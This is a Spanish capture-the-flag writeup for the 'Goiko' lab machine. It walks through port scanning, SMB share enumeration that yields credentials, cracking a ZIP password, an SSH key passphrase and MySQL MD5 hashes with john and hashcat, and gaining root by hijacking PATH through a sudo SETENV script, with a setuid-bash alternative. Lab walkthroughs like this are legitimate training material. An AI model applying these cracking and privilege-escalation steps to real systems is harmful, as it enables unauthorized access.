# Writeup — Goiko (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Debian 12 (Bookworm)  
**IP:** 10.10.10.15  
**Objetivo:** Obtener user.txt y root.txt  

---

## 1. Reconocimiento

```bash
sudo arp-scan -I eth0 --localnet
```
- IP víctima: `10.10.10.15`
- MAC: `08:00:27:79:47:72` (VirtualBox)

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.15 -oG all_ports.txt
nmap -p22,139,445,10021 -sCV -vvv 10.10.10.15 -oN tcp_scan.txt
```

**Puertos abiertos:**
- 22/tcp - SSH (OpenSSH 9.2p1 Debian)
- 139/tcp - NetBIOS (Samba)
- 445/tcp - SMB (Samba 4.17.12-Debian)
- 10021/tcp - FTP (vsftpd)

Nombre NetBIOS: `VENTURA`

---

## 2. Enumeración SMB

```bash
smbclient -L //10.10.10.15 -N
smbmap -H 10.10.10.15
```

**Shares:**
- `food` (READ ONLY)
- `dessert` (READ ONLY)
- `menu` (READ ONLY)
- `nobody` (NO ACCESS)
- `print$` (NO ACCESS)
- `IPC$` (NO ACCESS)

### Share `food`
```bash
smbclient //10.10.10.15/food -N
get creds.txt
```
Contenido: pista falsa (3 idiomas diciendo "si crees que es tan fácil vamos mal").

### Share `dessert`
```bash
smbclient //10.10.10.15/dessert -N
mget *
```
- `comida.txt`, `cafe.txt`: textos descriptivos sin relevancia.
- `creds.txt`: `user = m..... Look better :)`

### Share `menu`
```bash
smbclient //10.10.10.15/menu -N
get goiko.txt
get .cafesinleche
```
- `.cafesinleche` (archivo oculto) contiene:
  ```
  user = marmai
  pass = EspabilaSantiaga69
  ```

---

## 3. Acceso inicial - SSH como marmai

```bash
ssh marmai@10.10.10.15
# password: EspabilaSantiaga69
```

Usuario `marmai` sin permisos sudo, sin crontabs relevantes.

---

## 4. Enumeración del sistema

- `/etc/passwd`: usuarios `nika`, `camarero`, `gurpreet`, `marmai`
- `/opt/ftp/` vacío
- `/opt/porno/` con `watchporn.sh` (script bash con `find source_images -type f -name '*.jpg' -exec chown root:root {} \:`)
- Directorio `/opt/porno` owned by `nika`
- `/home/camarero/` contiene los shares SMB montados
- `gurpreet`, `nika` inaccesibles desde `marmai`

---

## 5. FTP - Puerto 10021

```bash
ftp marmai@10.10.10.15 -p 10021
# password: EspabilaSantiaga69
```

Descargamos `BurgerWithoutCheese.zip` (2406 bytes).

### Crack del ZIP
```bash
zip2john BurgerWithoutCheese.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: princess95

unzip BurgerWithoutCheese.zip
```

**Contenido:**
- `id_rsa` - clave privada SSH (protegida con passphrase)
- `users` - lista: `nika, caroline, gurpreet, santi, marsu`

### Crack de la passphrase de la clave
```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Passphrase: babygirl
```

### SSH con id_rsa
```bash
ssh gurpreet@10.10.10.15 -i id_rsa
# passphrase: babygirl
```

Usuario `gurpreet` - acceso al sistema.

```bash
gurpreet@ventura:~$ ls -l
total 40
drwxr-xr-x 2 gurpreet groupssh 4096 Apr 26  2024 Desktop
drwxr-xr-x 2 gurpreet groupssh 4096 Apr 26  2024 Documents
...
-rw-r--r-- 1 gurpreet groupssh   33 Jun  8  2024 user.txt
-rw-r--r-- 1 root     root      244 May 15  2024 nota

gurpreet@ventura:~$ cat user.txt
<REDACTED>

```

**Flag de user:** `<REDACTED>`  
También se encuentra un archivo `nota` que da la pista de que la base de datos contiene hashes débiles.

---

## 6. MySQL - Hashes de contraseñas

```bash
mysql -u gurpreet -p
# (sin contraseña)
```

**Base de datos `secta`, tabla `integrantes`:**
| id | name    | password                       |
|----|---------|--------------------------------|
| 1  | carline | `703ff9a12582b2aaaa3fe7f89bb976c8` |
| 2  | nika    | `c6f606a6b6a30cbaa428131d4c074787` |

### Crack de hashes MD5
```bash
hashcat -m 0 -a 0 '703ff9a12582b2aaaa3fe7f89bb976c8' /usr/share/wordlists/rockyou.txt
# carline:lucymylove

hashcat -m 0 -a 0 'c6f606a6b6a30cbaa428131d4c074787' /usr/share/wordlists/rockyou.txt
# nika: no crackeado en rockyou
```

La contraseña `lucymylove` corresponde a `carline`, pero también funciona para `nika`.

### Cambio a usuario nika
```bash
su nika
# password: lucymylove
```

---

## 7. Escalada a root

Usuario `nika` puede ejecutar con sudo y `SETENV`:

```bash
sudo -l
# (ALL) SETENV: NOPASSWD: /opt/porno/watchporn.sh
```

El script usa rutas relativas (`find`, `chown`, `source_images`). Aprovechamos que `SETENV` permite modificar `PATH`.

```bash
echo '/bin/bash' > /opt/porno/find
chmod 777 /opt/porno/find
sudo PATH=/opt/porno:$PATH /opt/porno/watchporn.sh
```

El script ejecuta `find` (nuestro falso `find` que lanza `/bin/bash`) con privilegios root. Conseguimos shell como root.

**Alternativa:** En lugar de lanzar directamente `/bin/bash`, podíamos haber hecho que el falso `find` ejecutase `chmod u+s /bin/bash` y luego, fuera del script, usar `bash -p` para obtener una shell root:

```bash
echo '#!/bin/bash' > /opt/porno/find
echo 'chmod u+s /bin/bash' >> /opt/porno/find
chmod 777 /opt/porno/find
sudo PATH=/opt/porno:$PATH /opt/porno/watchporn.sh
bash -p
```

### Flags
- **user.txt** (`/home/gurpreet/user.txt`): `<REDACTED>`
- **root.txt** (`/root/root.txt`): `<REDACTED>`

---

## 8. Resumen de credenciales

| Usuario   | Contraseña / Clave         |
|-----------|----------------------------|
| marmai    | `EspabilaSantiaga69`       |
| carline   | `lucymylove`               |
| nika      | `lucymylove`               |
| gurpreet  | `babygirl` (passphrase id_rsa) |
| Zip       | `princess95`               |
| id_rsa    | `babygirl` (passphrase)    |
